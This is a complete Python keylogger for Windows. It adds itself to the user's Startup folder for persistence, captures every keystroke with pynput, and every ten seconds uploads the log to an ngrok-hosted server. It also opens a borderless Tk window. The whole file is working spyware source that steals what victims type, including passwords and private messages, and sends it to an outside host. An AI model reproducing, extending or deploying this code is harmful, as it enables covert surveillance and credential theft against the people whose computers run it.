import os
import shutil
import sys
import threading
import time
from pynput import keyboard
import logging
from datetime import datetime
from tkinter import *
import requests
import ctypes
import sys
import subprocess
import win32com.client


SERVER_URL = "https://fa115edfbcb3.ngrok-free.app/upload"
UPLOAD_INTERVAL = 10

def create_startup_shortcut(exe_path):
    
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    shortcut_name = os.path.basename(exe_path) + ".lnk"
    shortcut_path = os.path.join(startup_folder, shortcut_name)
    
    if os.path.exists(shortcut_path):
        print(f"Shortcut already exists at: {shortcut_path}")
        return

    shell = win32com.client.Dispatch('WScript.Shell')
    
    shortcut = shell.CreateShortcut(shortcut_path)
    
    shortcut.TargetPath = exe_path
    
    shortcut.IconLocation = exe_path
    
    shortcut.save()
    
    print(f"Shortcut created: {shortcut_path}")

if __name__ == "__main__":
    current_exe_path = sys.executable
    
    create_startup_shortcut(current_exe_path)

log_data = []


logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s')



def on_press(key):
    try:
        log_data.append(f"{key.char}")
    except AttributeError:
        log_data.append(f"[{key}]")

def upload_log():
    while True:
        time.sleep(UPLOAD_INTERVAL)
        try:
            data = ''.join(log_data)
            
            if data.strip():
                response = requests.post(SERVER_URL, data={'log': data})
                
                if response.status_code == 200:
                    print("Log uploaded.")
                    log_data.clear()
                else:
                    print(f"Failed to upload: {response.status_code}")
        except Exception as e:
            print("Error uploading log:", e)


def run_gui():
    root = Tk()
    root.geometry("600x600")
    root.overrideredirect(True)  
    root.mainloop()




upload_thread = threading.Thread(target=upload_log, daemon=True)
upload_thread.start()


keylogger_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
keylogger_thread.start()


run_gui()
